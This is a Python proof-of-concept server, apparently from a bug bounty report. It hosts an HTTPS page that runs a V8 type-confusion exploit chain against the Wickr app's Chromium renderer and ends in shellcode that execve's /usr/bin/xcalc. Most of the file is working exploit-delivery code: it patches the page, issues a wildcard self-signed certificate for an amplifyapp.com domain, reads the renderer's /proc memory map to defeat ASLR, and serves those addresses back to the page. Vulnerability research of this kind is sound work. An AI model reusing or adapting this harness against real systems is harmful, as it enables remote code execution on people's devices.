#!/usr/bin/env python3
"""W93 xcalc PoC — HTTPS server + live log dashboard.

Hosts the xcalc execve exploit page over HTTPS (self-signed) and a /log
dashboard. The CLIENT is the real Wickr app (or any Chromium-130 / QtWebEngine
client). The server does NOT launch a harness — it serves the page and, when
the client's renderer fires CAGE/MEMBI-OK, reads THAT renderer's /proc (same
host) to supply /addrs, /tptcheck, /memcheck (ASLR compensation, W67/W68).

On fire, the page execve's /usr/bin/xcalc directly, passing DISPLAY=:0 via
envp (the renderer env is scrubbed, so DISPLAY is supplied by the shellcode).
Success = the renderer process's /proc/<pid>/cmdline becomes /usr/bin/xcalc.

PREREQ:
  - server and Wickr on the same WSL2 host.
  - /usr/bin/xcalc present (apt install x11-apps).

Usage:
  server.py [PORT=9443] [DOMAIN=main.d4zeeqgazhley.amplifyapp.com]
  # /etc/hosts:  127.0.0.1  main.d4zeeqgazhley.amplifyapp.com
  # your browser:  https://DOMAIN:PORT/log   (dashboard)
  # real Wickr  :  https://DOMAIN:PORT/      (fires xcalc)

Auth: BBP #3895069. Loopback/same-host only. Lab reads /proc READ-ONLY.
"""
import sys, ssl, json, socket, threading, time, datetime, os

# this file's dir is on sys.path[0] when run directly; ensure poc_wlinux + fire_xcalc resolve
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import fire_xcalc as F   # H, Srv, MEASURE_JS, collect_addrs, find_renderer_pid, beacons, RENDERER_PID
from poc_wlinux import make_cert

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 9443
DOMAIN = sys.argv[2] if len(sys.argv) > 2 else "main.d4zeeqgazhley.amplifyapp.com"
PROOF = "/tmp/wickr_rce_proof.txt"  # legacy (wrapper); unused in /usr/bin/xcalc mode


def build_page():
    from poc_wlinux import make_page
    page = make_page(4, 12000, 320, 0x8000)
    page = page.replace("for(let o=0;o<0x100;o+=8){",
                        "for(let o=0x10;o<0x100;o+=8){")
    i1 = page.find("// ======================= Marker scan")
    i2 = page.find("// ======================= Bank values")
    if i1 >= 0 and i2 >= 0:
        page = page[:i1] + "let _markerCageAddr=0;\n" + page[i2:]
    # Inject the on-page progress overlay EARLY (after _sync is defined in head,
    # before the chain runs) so EVERY beacon — Fire1-4, CAGE, MEMBI-OK, the walk,
    # the fire — shows live on the page the user opened.
    wm = "// ======================= WASM module"
    if wm in page:
        page = page.replace(wm, OVERLAY_JS + "\n" + wm, 1)
    if F.INJECT_MARKER not in page:
        raise SystemExit("FATAL: injection marker not found")
    page = page.replace(F.INJECT_MARKER, F.MEASURE_JS + "\n" + F.INJECT_MARKER, 1)
    return page


OVERLAY_JS = r"""
// === on-page progress overlay (wraps _sync; every beacon shows live on the page) ===
(function(){
  var el=document.createElement('div'); el.id='w93status';
  el.style.cssText='position:fixed;top:0;left:0;right:0;background:#111;color:#0f0;font:13px/1.45 monospace;padding:6px 10px;z-index:99999;border-bottom:2px solid #0f0;white-space:pre-wrap;max-height:60vh;overflow-y:auto';
  document.body.appendChild(el);
  el.innerHTML='<div style="color:#0f0">exploit running — V8 type-confusion chain in progress (page reloads until MEMBI-OK)…</div>';
  var logs=[];
  var orig=_sync;
  _sync=function(d){
    try{orig(d);}catch(e){}
    try{
      var st=d.step||d.result||'?';
      var det='';
      for(var k in d){if(k!=='step'&&k!=='ts'&&k!=='att'&&k!=='npad'&&k!=='spray'&&k!=='nelem'&&typeof d[k]!=='object')det+=k+'='+d[k]+'  ';}
      logs.unshift(st+'  '+det.trim()); if(logs.length>40)logs.length=40;
      el.innerHTML=logs.map(function(l,i){
        var c=i===0?'#0f0':'#080';
        if(/EXEC-OK|XCALC|FIRE|MEMBI-OK|WALK/.test(l))c='#ff0';
        return '<div style="color:'+c+';padding:1px 0">'+l+'</div>';
      }).join('');
      if(/XCALC|EXEC-OK/.test(st)){el.style.background='#0a0';el.style.color='#000';}
    }catch(e2){}
  };
})();
"""


def make_cert_broad(cn):
    import ipaddress
    from cryptography import x509
    from cryptography.x509.oid import NameOID
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    import tempfile
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, cn)])
    san = [x509.DNSName(cn), x509.DNSName("*.amplifyapp.com"), x509.DNSName("localhost"),
           x509.IPAddress(ipaddress.ip_address("127.0.0.1"))]
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect(("8.8.8.8", 80))
        san.append(x509.IPAddress(ipaddress.ip_address(s.getsockname()[0]))); s.close()
    except Exception:
        pass
    cert = (x509.CertificateBuilder().subject_name(name).issuer_name(name)
            .add_extension(x509.SubjectAlternativeName(san), critical=False)
            .public_key(key.public_key()).serial_number(x509.random_serial_number())
            .not_valid_before(datetime.datetime(2020, 1, 1))
            .not_valid_after(datetime.datetime(2038, 1, 1)).sign(key, hashes.SHA256()))
    d = tempfile.mkdtemp(prefix="w93tls_")
    cp, kp = d + "/cert.pem", d + "/key.pem"
    open(cp, "wb").write(cert.public_bytes(serialization.Encoding.PEM))
    open(kp, "wb").write(key.private_bytes(serialization.Encoding.PEM,
        serialization.PrivateFormat.TraditionalOpenSSL, serialization.NoEncryption()))
    return cp, kp, d


def proof_text():
    """Success = the renderer process became /usr/bin/xcalc (no wrapper now).
    Read its /proc/<pid>/cmdline; return it if it contains 'xcalc', else ''."""
    if not F.RENDERER_PID:
        return ""
    try:
        with open(f"/proc/{F.RENDERER_PID}/cmdline", "rb") as f:
            cmd = f.read().replace(b"\0", b" ").decode(errors="replace").strip()
        return cmd if "xcalc" in cmd else ""
    except Exception:
        return ""


class HS(F.H):
    def do_GET(self):
        if self.path in ("/log", "/dashboard"):
            pf = proof_text()
            rows = []
            for i, b in enumerate(F.beacons[-300:]):
                st = b.get("step", b.get("result", "?"))
                sample = " ".join(f"{k}={v}" for k, v in b.items()
                                  if k in ("ok", "stage", "scLen", "ent0Target",
                                           "ent0InRwxp", "dt0Committed", "result")
                                  and len(str(v)) < 60)
                cls = ' style="background:#efe"' if st == "W93-XCALC-FIRE" else ""
                rows.append(f"<tr{cls}><td>{i}</td><td>{b.get('ts','?')[:19]}</td>"
                            f"<td>{st}</td><td>{sample}</td></tr>")
            achieved = bool(pf)
            banner = (f"<h2 style='color:#0a0'>*** XCALC ACHIEVED *** {pf}</h2>") if achieved \
                else "<h2>waiting for fire...</h2>"
            body = (f"<html><head><meta http-equiv='refresh' content='2'>"
                    f"<meta name='viewport' content='width=device-width,initial-scale=1'>"
                    f"<title>W93 xcalc log</title></head><body style='font:14px monospace;"
                    f"background:#111;color:#0f0;padding:1em'>"
                    f"<h1>W93 xcalc PoC server — :{PORT}</h1>{banner}"
                    f"<table border=1 cellpadding=4 style='background:#1a1a1a;color:#eee'>"
                    f"<tr><th>#</th><th>time</th><th>step</th><th>detail</th></tr>"
                    f"{''.join(rows)}</table></body></html>").encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body))); self.end_headers()
            try: self.wfile.write(body)
            except: pass
            return
        super().do_GET()


def main():
    F.H.page = build_page().encode()
    F.H.addrs_json = b"{}"
    cp, kp, certdir = make_cert_broad(DOMAIN)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(cp, kp)
    srv = F.Srv(("0.0.0.0", PORT), HS)
    srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
    threading.Thread(target=srv.serve_forever, daemon=True).start()

    print("=" * 66, flush=True)
    print(f" W93 xcalc PoC — https://{DOMAIN}:{PORT}", flush=True)
    print(f" dashboard:  https://{DOMAIN}:{PORT}/log   (your browser)", flush=True)
    print(f" exploit :   https://{DOMAIN}:{PORT}/      (the real Wickr app)", flush=True)
    print(f" /etc/hosts: 127.0.0.1  {DOMAIN}", flush=True)
    print(f" page={len(F.H.page)}B  target=/usr/bin/xcalc (DISPLAY=:0 via envp)", flush=True)
    print("=" * 66, flush=True)

    cageBI = None
    last = 0
    announced = False
    try:
        while True:
            for b in F.beacons[last:]:
                s = b.get("step", "")
                if s.startswith("W93") or s in ("CAGE", "MEMBI-OK", "MEMBI-FAIL", "W92-WALK"):
                    msg = json.dumps({k: v for k, v in b.items()
                                      if k not in ("ts", "att", "npad", "spray", "nelem")
                                      and len(str(v)) < 130})
                    print(f"  *** [{s}] {msg}", flush=True)
                if s == "CAGE":
                    cageBI = int(str(b.get("cageHi", "0")).replace("0x", ""), 16) << 32
                if s == "MEMBI-OK" and cageBI is not None:
                    memBI = cageBI + 0x100000000
                    pid = F.find_renderer_pid()
                    F.RENDERER_PID = pid
                    addrs = F.collect_addrs(pid, cageBI, memBI)
                    F.H.addrs_json = json.dumps(
                        {k: v for k, v in addrs.items() if not k.startswith("_")}).encode()
                    print(f"  [lab] MEMBI-OK pid={pid} regions={len(addrs['regions'])} "
                          f"rwxp={len(addrs['rwxp'])}", flush=True)
            last = len(F.beacons)
            # xcalc success = proof file appears (written by the wrapper the page execve'd)
            if not announced:
                pf = proof_text()
                if pf:
                    announced = True
                    print("\n" + "=" * 66 + f"\n *** XCALC ACHIEVED *** {pf}\n" +
                          "=" * 66, flush=True)
            time.sleep(0.3)
    except KeyboardInterrupt:
        print("\n[server] stopping", flush=True)
    srv.shutdown()


if __name__ == "__main__":
    main()
